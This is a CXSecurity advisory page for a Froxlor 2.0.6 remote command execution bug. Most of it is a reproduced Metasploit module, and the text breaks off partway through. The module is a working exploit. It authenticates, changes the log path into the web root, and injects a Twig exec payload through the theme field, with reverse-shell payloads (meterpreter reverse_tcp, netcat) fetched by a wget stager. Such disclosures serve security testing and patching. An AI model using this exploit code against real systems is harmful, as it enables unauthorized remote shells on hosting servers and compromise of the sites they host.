---
title: Froxlor 2.0.6 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2023020040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-25
fetch_date: 2025-10-04T08:03:22.602353
---

# Froxlor 2.0.6 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Froxlor 2.0.6 Remote Command Execution** **2023.02.24**  Credit:  **[Askar](https://cxsecurity.com/author/Askar/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Froxlor Log Path RCE',
'Description' => %q{
Froxlor v2.0.6 and below suffer from a bug that allows authenticated users to change the application logs path
to any directory on the OS level which the user www-data can write without restrictions from the backend which
leads to writing a malicious Twig template that the application will render. That will lead to achieving a
remote command execution under the user www-data.
},
'Author' => [
'Askar', # discovery
'jheysel-r7' # module
],
'References' => [
[ 'URL', 'https://shells.systems/author/askar/'],
[ 'CVE', '2023-0315']
],
'License' => MSF\_LICENSE,
'Platform' => 'linux',
'Privileged' => false,
'Arch' => [ ARCH\_CMD ],
'Targets' => [
[
'Linux ',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'CmdStagerFlavor' => ['wget'],
'Type' => :linux\_dropper,
'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp' }
}
],
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_memory,
'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse\_netcat' }
}
]
],
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
},
'DisclosureDate' => '2023-01-29'
)
)
register\_options(
[
OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'admin']),
OptString.new('PASSWORD', [true, 'A specific password to authenticate with', '']),
OptString.new('TARGETURI', [true, 'The base path to the vulnerable Froxlor instance', '/froxlor']),
OptString.new('WEB\_ROOT', [true, 'The webroot ', '/var/www/html'])
]
)
end
def login
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, '/index.php'),
'keep\_cookies' => true,
'vars\_post' => {
'loginname' => datastore['USERNAME'],
'password' => datastore['PASSWORD'],
'send' => 'send',
'dologin' => ''
}
)
if res && (res.code == 302 && res.headers.include?('Location') && res.headers['Location'] == 'admin\_index.php')
send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, '/admin\_index.php'),
'keep\_cookies' => true
)
print\_good('Successful login')
true
else
false
end
end
def check
begin
@authenticated = login
rescue InvalidRequest, InvalidResponse => e
return Exploit::CheckCode::Unknown("Failed to authenticate to Froxlor: #{e.class}, #{e}")
end
version\_url = '/lib/ajax.php?action=updatecheck&theme=Froxlor'
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, version\_url),
'keep\_cookies' => true
)
if res.nil? || res.code != 200
Exploit::CheckCode::Unknown("Failed to retrieve version info from #{normalize\_uri(target\_uri.path, version\_url)}")
else
version = res.get\_html\_document.at('body/span/text()')
if version
if Rex::Version.new('2.0.6') >= Rex::Version.new(version)
Exploit::CheckCode::Appears("Vulnerable version found: #{version}")
end
else
Exploit::CheckCode::Detected("Failed to obtain Froxlor version info from #{normalize\_uri(target\_uri.path, version\_url)}")
end
end
end
def get\_csrf\_token(url)
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, url),
'keep\_cookies' => true
)
fail\_with(Failure::UnexpectedReply, "Failed to get csrf token from #{normalize\_uri(target\_uri.path, url)}") unless (!res.nil? || res.code == 200)
csrf\_token = res.get\_html\_document.at('//input[@name="csrf\_token"]/@value')&.text
fail\_with(Failure::UnexpectedReply, "No CSRF token found when querying #{normalize\_uri(target\_uri.path, url)}.") unless csrf\_token
print\_good("CSRF token is : #{csrf\_token}")
csrf\_token
end
def change\_log\_path(new\_logfile)
mime = Rex::MIME::Message.new
mime.add\_part('0', nil, nil, 'form-data; name="logger\_enabled"')
mime.add\_part('1', nil, nil, 'form-data; name="logger\_enabled"')
mime.add\_part('2', nil, nil, 'form-data; name="logger\_severity"')
mime.add\_part('file', nil, nil, 'form-data; name="logger\_logtypes[]"')
mime.add\_part(new\_logfile, nil, nil, 'form-data; name="logger\_logfile"')
mime.add\_part('0', nil, nil, 'form-data; name="logger\_log\_cron"')
mime.add\_part(@csrf\_token, nil, nil, 'form-data; name="csrf\_token"')
mime.add\_part('overview', nil, nil, 'form-data; name="page"')
mime.add\_part('', nil, nil, 'form-data; name="action"')
mime.add\_part('send', nil, nil, 'form-data; name="send"')
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, '/admin\_settings.php?'),
'vars\_get' => { 'page' => 'overview', 'part' => 'logging' },
'keep\_cookies' => true,
'ctype' => "multipart/form-data; boundary=#{mime.bound}",
'data' => mime.to\_s
)
if res && res.code == 200 && res.body.include?('The settings have been successfully saved')
return true
end
false
end
def execute\_command(cmd, \_opts = {})
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, '/admin\_index.php'),
'keep\_cookies' => true,
'vars\_post' => {
'theme' => "{{['#{cmd}']|filter('exec')}}",
'csrf\_token' => @csrf\_token,
'page' => 'change\_theme',
'send' => 'send',
'dosave' => ''
}
)
if res && res.code == 302 && res.headers['Location']
if res.headers['Location'] == 'admin\_index.php'
print\_good('Injected payload successfully')
print\_status("Changing log path back to default value while triggering payload: #{datastore['WEB\_ROOT']}#{datastore['TARGETURI']}/logs/froxlor.log")
change\_log\_path("#{datastore['WEB\_ROOT']}#{...